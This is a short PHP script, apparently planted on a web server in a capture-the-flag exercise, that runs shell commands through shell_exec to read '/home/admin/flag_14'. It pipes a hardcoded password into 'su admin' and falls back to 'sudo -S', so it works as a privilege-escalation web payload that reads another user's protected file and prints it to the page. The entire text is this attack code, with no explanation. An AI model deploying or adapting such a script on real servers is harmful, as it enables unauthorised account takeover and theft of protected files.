<?php
echo "<pre>";

$command = "echo 'marshall' | su admin -c 'cat /home/admin/flag_14'";
$output = shell_exec($command);
echo "Output:\n$output\n";

// If that doesn't work, try with sudo
$command2 = "echo 'marshall' | sudo -S -u admin cat /home/admin/flag_14";
$output2 = shell_exec($command2);
echo "Sudo output:\n$output2\n";

echo "</pre>";
?>
